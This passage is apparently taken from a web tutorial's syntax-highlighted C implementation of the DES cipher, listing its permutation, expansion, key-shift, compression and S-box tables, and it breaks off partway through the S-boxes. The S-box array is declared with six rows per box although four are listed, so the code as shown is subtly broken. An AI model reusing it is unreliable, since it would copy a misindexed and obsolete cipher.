        <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">7</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x5BC6;&#x94A5;&#x521D;&#x59CB;&#x7F6E;&#x6362;    
    char key_ch<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span>
        <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span>
        <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span>
        <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x6269;&#x5C55;&#x7F6E;&#x6362;    
    char msg_ex<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>
        <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span>
        <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span>
        <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token number">1</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x6BCF;&#x8F6E;&#x5BC6;&#x94A5;&#x7684;&#x4F4D;&#x79FB;    
    char key_mov<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token operator">/</span><span class="token operator">/</span> &#x538B;&#x7F29;&#x7F6E;&#x6362;    
    char key_cmprs<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>
        <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>
        <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span>
        <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">32</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token operator">/</span><span class="token operator">/</span> <span class="token constant">S</span> &#x76D2;&#x7F6E;&#x6362;    
    char s_box<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token operator">/</span><span class="token operator">/</span> <span class="token constant">S1</span>    
        <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>
        <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>
        <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>
        <span class="token operator">/</span><span class="token operator">/</span> <span class="token constant">S2</span>    
        <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>
        <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>
        <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>
        <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>
        <span class="token operator">/</span><span class="token operator">/</span> <span class="token constant">S3</span>    
        <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>
        <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>
        <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>
        <span class="token operator">/</span><span class="token operator">/</span> <span class="token constant">S4</span>    
        <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>
        <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>
        <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>
        <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>
        <span class="token operator">/</span><span class="token operator">/</span> <span class="token constant">S5</span>    
        <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>
        <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>
        <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>
        <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>
        <span class="token operator">/</span><span class="token operator">/</span> <span class="token constant">S6</span>    
        <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>
        <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>
        <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>
